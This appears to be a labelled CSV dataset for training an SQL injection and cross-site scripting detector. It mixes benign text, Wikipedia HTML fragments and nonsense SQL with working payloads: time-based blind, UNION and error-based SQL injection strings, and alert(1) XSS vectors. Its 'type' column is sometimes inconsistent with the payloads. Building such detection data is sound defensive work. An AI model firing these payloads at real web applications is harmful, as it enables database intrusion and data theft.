Text,Label,type
"1%' and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,xss
7.28211E+15,0,sql
"1""  )   where 3122  =  3122 and sleep  (  5  )  #",1,sql
"<style>@keyframes x{}</style><body style=""animation-name:x"" onanimationstart=""alert(1)""></body>",2,xss
"<embed onkeypress=""alert(1)"" contenteditable>test</embed>",2,xss
42210,0,sql
SELECT * FROM positive,0,sql
	 </span> ,0,xss
"<div class=""section"" id=""all-the-rest"">",0,xss
atigrada,0,sql
tinti@21horas.hr,0,xss
SELECT * FROM chose WHERE shut BETWEEN 'unknown' AND 'leaf',0,sql
"1%""   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1,sql
"<iframe onkeypress=""alert(1)"" contenteditable>test</iframe>",2,xss
SELECT * FROM  ( SELECT compare FROM private ) ,0,xss
SELECT * FROM sea FETCH FIRST 3 ROWS ONLY,0,xss
<input type=radio id=x onfocus=alert(1)>,2,xss
"<li><a href=""/wiki/New_mysterianism"" title=""New mysterianism"">New mysterianism </a> </li>",0,xss
"1""  )   where 5850  =  5850 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
"<listing onkeydown=""alert(1)"" contenteditable>test</listing>",2,xss
3.81894E+15,0,sql
"1""  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  ""qblj"" like ""qblj",1,sql
<big onpointerup=alert(1)>XSS</big>,2,xss
97,0,xss
"1%' or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,sql
"<button draggable=""true"" ondragleave=""alert(1)"">test</button>",2,xss
SELECT jump,0,sql
SELECT * FROM goes WHERE fell BETWEEN invented09/01/1996needs AND bigger15/31/1996atmosphere,0,sql
nail,0,sql
"<li><a href=""#CITEREFNilsson1998"">Nilsson 1998 </a>, chpt. 7–12 </li> </ul>",0,xss
<script onpointerover=alert(1)>XSS</script>,2,xss
"-7194'||  (  select 'gbrx' from dual where 6205  =  6205 union all select 6205,6205,6205,6205,6205,6205,6205#",1,sql
"1""  )   as fkgs where 5948  =  5948 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,xss
1' and   (  3020  =  3020  )  *6703 and 'tmng' like 'tmng,1,sql
SELECT TOP 3 * FROM strength SELECT * FROM mathematics 3SELECT * FROM gulf,0,sql
5122,0,sql
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=www.cnas.org%2Fpublications%2Freports%2Funderstanding-chinas-ai-strategy&amp;rft.atitle=Understanding+China%27s+AI+Strategy&amp;rft.date=2019-02-06&amp;rft.aulast=Allen&amp;rft.aufirst=Gregory&amp;rft_id=https%3A%2F%2Fwww.cnas.org%2Fpublications%2Freports%2Funderstanding-chinas-ai-strategy&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
<dialog onpointerdown=alert(1)>XSS</dialog>,2,xss
finak,0,sql
SELECT * FROM here WHERE cap NOT LIKE '[sentence]%',0,sql
	 <div>,0,xss
pusit@marketingmunicipal.ro,0,sql
          <dd>,0,xss
SELECT * FROM snow WHERE Price NOT BETWEEN 10 AND 20,0,sql
SELECT slow FROM result UNION SELECT similar FROM function ORDER BY swing,0,sql
"<aside oncut=""alert(1)"" contenteditable>test</aside>",2,xss
"<STYLE>li {list-style-image: url(""javascript:alert('')"");}</STYLE><UL><LI></br>",2,xss
"RC=""data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="" type=""image/svg+xml"" AllowScriptAccess=""always""",2,xss
6.51129E+15,0,xss
SELECT silence FROM caught UNION SELECT upward FROM except ORDER BY one,0,sql
<center id=x tabindex=1 onbeforeactivate=alert(1)></center>,2,xss
-7903 where 6699  =  6699 or 8571  =  8571--,1,sql
SELECT COUNT ( whetherID ) FROM partly,0,sql
"1""  )   where 3250  =  3250 union all select null#",1,sql
"1 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  ",1,sql
"1 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",1,sql
"  UPDATE camp SET right =  'forest', City =  'young' WHERE main =  ring",0,xss
"1""   )    )    as fmul where 7827  =  7827",1,sql
"1%""   )    )     )   order by 1--",1,sql
"  SELECT * FROM mood WHERE club NOT IN  ( 'explore', 'negative', 'program' )  ",0,sql
"-3460%""   )    )     )   or 9323  =  9323#",1,sql
2425,0,sql
 </li>,0,xss
6.39488E+14,0,sql
uriah,0,sql
"<ol onmouseenter=""alert(1)"">test</ol>",2,xss
-5116  )   or   (  8287  =  4930  )  *4930,1,sql
"  SELECT towardID AS ID, needle AS influence FROM fly",0,xss
8.99091E+15,0,xss
<dir onpointermove=alert(1)>XSS</dir>,2,xss
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Artsy&amp;rft.atitle=It%27s+Getting+Hard+to+Tell+If+a+Painting+Was+Made+by+a+Computer+or+a+Human&amp;rft.date=2017-09-21&amp;rft.aulast=Chun&amp;rft.aufirst=Rene&amp;rft_id=https%3A%2F%2Fwww.artsy.net%2Farticle%2Fartsy-editorial-hard-painting-made-computer-human&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
" </p><p>Learning algorithms work on the basis that strategies, algorithms, and inferences that worked well in the past are likely to continue working well in the future. These inferences can be obvious, such as ""since the sun rose every morning for the last 10,000 days, it will probably rise tomorrow morning as well"". They can be nuanced, such as ""X% of <a href=""/wiki/Family_(biology)"" title=""Family (biology)"">families </a> have geographically separate species with color variants, so there is a Y% chance that undiscovered <a href=""/wiki/Black_swan_theory"" title=""Black swan theory"">black swans </a> exist"". Learners also work on the basis of ""<a href=""/wiki/Occam%27s_razor#Probability_theory_and_statistics"" title=""Occam&#39;s razor"">Occam's razor </a>"": The simplest theory that explains the data is the likeliest. Therefore, according to Occam's razor principle, a learner must be designed such that it prefers simpler theories to complex theories, except in cases where the complex theory is proven substantially better.",0,xss
	 </span>,0,xss
"<ul><li><a href=""#CITEREFLucas1961"">Lucas 1961 </a> </li>",0,xss
"1"" where 7631  =  7631 and 4733  =  3439",1,sql
" select * from users where id  =  1 or "".,"" or 1  =  1 -- 1",1,sql
latin,0,sql
dinaband,0,sql
<rtc onpointerup=alert(1)>XSS</rtc>,2,xss
goldsmith1@esmarbella.ht,0,sql
SELECT then FROM upper UNION SELECT double FROM army ORDER BY strong,0,sql
"iif  (  2084  =  5671,1,1/0  )  ",1,sql
-8004%'  )   or   (  2301  =  7504  )  *7504 and   (  '%'  =  ',1,sql
"1'  )   where 3476  =  3476 and elt  (  1210  =  1210,sleep  (  5   )    )   --",1,sql
reich.puffy@g-audi.pe,0,xss
1  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  7015  =  7015,1,xss
"<div oncopy=""alert(1)"" contenteditable>test</div>",2,xss
4.71E+15,0,sql
1'+  (  select 'feof' where 1966  =  1966,1,sql
c5fra98,0,sql
"-5181""   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  ""qofp""  =  ""qofp",1,sql
FROM  ( SELECT DISTINCT uncle FROM nervous ) ,0,sql
" select * from users where id  =  1 or ""  (    )  "" or 1  =  1 -- 1",1,sql
-9225  )   or   (  8258  =  2726  )  *2726 and   (  9900  =  9900,1,xss
"<ins onbeforepaste=""alert(1)"" contenteditable>test</ins>",2,xss
"1 or elt  (  6272  =  6272,sleep  (  5   )    )   ",1,xss
8.5138E+15,0,sql
SELECT * FROM college FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM particular,0,sql
"<style>:target {color:red;}</style><form id=x style=""transition:color 1s"" ontransitionend=alert(1)></form>",2,xss
"<sub draggable=""true"" ondrag=""alert(1)"">test</sub>",2,xss
"<h2><span class=""mw-headline"" id=""Basics"">Basics ",0,xss
6e1ba,0,sql
scorziel,0,xss
"	<div class=""portal"" role=""navigation"" id=""p-lang""  aria-labelledby=""p-lang-label"">",0,xss
"-6928""   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   ""mxhr"" like ""mxhr",1,sql
radresa aja,0,sql
1'   )    )    as rxxd where 5049  =  5049,1,sql
-1385'   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'mjjd'  =  'mjjd,1,xss
" select * from users where id  =  1 or 1#""@ union select 'a',version  (    )   -- 1",1,sql
"<div role=""note"" class=""hatnote navigation-not-searchable"">Main article: <a href=""/wiki/Friendly_AI"" class=""mw-redirect"" title=""Friendly AI"">Friendly AI </a> </div>",0,xss
"-9881""   )    )    or 9850  =  8118#",1,xss
"1'  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'cuat'  =  'cuat",1,sql
"<li><a href=""#CITEREFLakoffNúñez2000"">Lakoff &amp; Núñez (2000) </a> have controversially argued that even our skills at mathematics depend on knowledge and skills that come from ""the body"", i.e. sensorimotor and perceptual skills. (See <a href=""/wiki/Where_Mathematics_Comes_From"" title=""Where Mathematics Comes From"">Where Mathematics Comes From </a>) </li> </ul>",0,xss
gail,0,sql
FROM  ( SELECT DISTINCT instance FROM pay ) ,0,sql
"   SELECT jet, city+ ', ' + soil+ ' ' + growth+ ', ' + entire AS wrote  FROM play",0,sql
SELECT * FROM is WHERE perfectly BETWEEN '1996-07-01' AND '1996-07-31',0,sql
"<p>Political scientist <a href=""/wiki/Charles_T._Rubin"" title=""Charles T. Rubin"">Charles T. Rubin </a> believes that AI can be neither designed nor guaranteed to be benevolent.<sup id=""cite_ref-399"" class=""reference""><a href=""#cite_note-399"">&#91;388&#93; </a> </sup> He argues that ""any sufficiently advanced benevolence may be indistinguishable from malevolence."" Humans should not assume machines or robots would treat us favorably because there is no <i>a priori </i> reason to believe that they would be sympathetic to our system of morality, which has evolved along with our particular biology (which AIs would not share). Hyper-intelligent software may not necessarily decide to support the continued existence of humanity and would be extremely difficult to stop. This topic has also recently begun to be discussed in academic publications as a real source of risks to civilization, humans, and planet Earth.",0,xss
"1%'   )    )     )   union all select null,null,null,null,null,null,null--",1,sql
"<wbr onmouseup=""alert(1)"">test</wbr>",2,xss
"INSERT INTO solar ( army, rise, youth, course, select, electricity )  VALUES  ( 'exist', 'anywhere'. product', 'near', 'market', 'section', 'however' )  ",0,sql
or x  =  x,1,xss
SELECT * FROM settlers WHERE decide LIKE '%trace%',0,sql
"1""  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  ""bvdv"" like ""bvdv",1,sql
villamediana de iregua,0,xss
"c/ clivia, 1, 1?d",0,sql
ario,0,sql
<iframe onfocusout=alert(1) id=x><input autofocus>,2,xss
"   SELECT itself, stood, protection FROM how WHERE mountain  IS NULL",0,sql
"  SELECT grandmother,headed,element FROM bright LEFT JOIN Orders ON wear.areID =  birds.frame ORDER BY customs.musical",0,sql
"   SELECT itself, happen, breathe FROM first WHERE thing  IS NULL",0,sql
lesaca clar,0,xss
"<li><a href=""/wiki/Semantics_(computer_science)"" title=""Semantics (computer science)"">Semantics </a> </li> </ul>",0,xss
1  )   as pyjx where 9005  =  9005,1,sql
"1'   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  'ochr' like 'ochr",1,sql
"1""  )   where 1392  =  1392 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1,sql
"1""  )   as assu where 7521  =  7521 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sql
SELECT why ( s )  FROM just FULL OUTER JOIN,0,sql
"-4205'  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",1,sql
laguna abusaid,0,xss
SELECT AVG ( beginning ) FROM lower SELECT SUM ( exchange ) ,0,xss
"<option draggable=""true"" ondragenter=""alert(1)"">test</option>",2,xss
16802646l,0,sql
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Fortune&amp;rft.atitle=Why+Deep+Learning+Is+Suddenly+Changing+Your+Life&amp;rft.date=2016&amp;rft_id=http%3A%2F%2Ffortune.com%2Fai-artificial-intelligence-deep-machine-learning%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
<input id=x onfocus=alert(1)>,2,xss
"  UPDATE nice SET surprise =  'rope', City =  'beginning' WHERE later =  image",0,xss
"<li id=""cite_note-3""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-3"">^ </a> </b> ",0,xss
"1""   )    )    as osuh where 8809  =  8809",1,sql
" select * from users where id  =  '1' <@._ union select 1,version  (    )   -- 1'",1,sql
-6865  )   or   (  8459  =  8459  )  *4906 and   (  6107  =  6107,1,sql
6.61271E+15,0,sql
"<li class=""toclevel-1 tocsection-14""><a href=""#Approaches""><span class=""tocnumber"">5 ",0,xss
SELECT * FROM vegetable WHERE purpose = 'canal'  OR last = 'paint',0,xss
"	 </span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""https://www.wired.com/story/facebook-quietly-enters-starcraft-war-for-ai-bots-and-loses/"">""Facebook Quietly Enters StarCraft War for AI Bots, and Loses"" </a>. <i>WIRED </i>. 2017<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">7 May ",0,xss
SELECT * FROM two WHERE library = 'keep'  OR ants = 'closely',0,sql
suen,0,sql
"	 </span> <span class=""reference-text""><a href=""#CITEREFOudeyer2010"">Oudeyer 2010 </a>. ",0,xss
 </li>,0,xss
SELECT * FROM occasionally WHERE headed NOT BETWEEN 'firm' AND 'thin',0,sql
" select * from users where id  =  1 -1<@ union select 1,version  (    )   -- 1",1,xss
SELECT * FROM dirty WHERE fellow  BETWEEN 10 AND 20,0,sql
SELECT * FROM article WHERE lunch = 'upper',0,sql
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   ""bhmu"" like ""bhmu",1,sql
crip3gama,0,sql
FROM  ( SELECT DISTINCT dug FROM over ) ,0,sql
SELECT * FROM  ( SELECT fur FROM stared ) ,0,xss
03t86i3,0,sql
"<frameset onmouseenter=""alert(1)"">test</frameset>",2,xss
"1'   )    )     )   union all select null,null,null,null,null,null--",1,sql
"1'  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'bzgs' like 'bzgs",1,sql
 </li>,0,xss
1' order by 1#,1,sql
"1'   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'rggg'  =  'rggg",1,sql
"<div draggable=""true"" contenteditable>drag me</div><em ondragover=alert(1) contenteditable>drop here</em>",2,xss
" </div> </td> </tr><tr><td class=""navbox-abovebelow"" colspan=""2"" style=""text-align: center;"">",0,xss
SELECT * FROM radio  WHERE means = suppose,0,sql
"1%""  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,sql
SELECT * FROM manufacturing WHERE wooden NOT LIKE '[difference]%',0,sql
"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",1,sql
"<track draggable=""true"" ondragstart=""alert(1)"">test</track>",2,xss
"1'  )   and make_set  (  6488  =  5525,5525  )  ",1,sql
"  SELECT noted,instrument FROM star WHERE visit = 'end' UNION SELECT you, riding FROM hardly",0,sql
"aldea de san nicols, la",0,sql
SELECT * FROM  ( SELECT care FROM yesterday ) ,0,sql
-1479%' or 5201  =  3398--,1,sql
<basefont id=x tabindex=1 onactivate=alert(1)></basefont>,2,xss
1'+  (  select qydm where 6019  =  6019,1,sql
32621,0,sql
SELECT * FROM get WHERE citizen BETWEEN alone09/01/1996getting AND behavior15/31/1996under,0,sql
dean,0,sql
3.20326E+15,0,sql
	<ul >,0,xss
"<dir onbeforepaste=""alert(1)"" contenteditable>test</dir>",2,xss
SELECT * FROM rather 3 SELECT * FROM prove,0,sql
"-6681""  )   or 5251  =  1162",1,sql
 UPDATE close SET toy = 'anyone'WHERE sail = 'hill',0,sql
gherardo,0,sql
"INSERT INTO tall ( oxygen, coach, term, discussion, lake, fall )  VALUES  ( 'married', 'comfortable'. surprise', 'summer', 'tune', 'suppose', 'skill' )  ",0,sql
17621392b,0,sql
"<h3><span class=""mw-headline"" id=""Classifiers_and_statistical_learning_methods"">Classifiers and statistical learning methods ",0,xss
</div>,0,xss
<rt id=x tabindex=1 onbeforeactivate=alert(1)></rt>,2,xss
"INSERT INTO powder  ( tonight, supper, larger )  VALUES  ( 'minute', 'spirit', 'characteristic' )  ",0,xss
painter.stovin@tetdevelocidad.bn,0,sql
"<time onbeforecopy=""alert(1)"" contenteditable>test</time>",2,xss
"<wbr draggable=""true"" ondrag=""alert(1)"">test</wbr>",2,xss
"<div onkeyup=""alert(1)"" contenteditable>test</div>",2,xss
at89a7218,0,sql
6e665a,0,xss
<command onpointerout=alert(1)>XSS</command>,2,xss
SELECT * FROM evidence WHERE then NOT LIKE 'memory%',0,sql
"<style>:target {transform: rotate(180deg);}</style><details id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></details>",2,xss
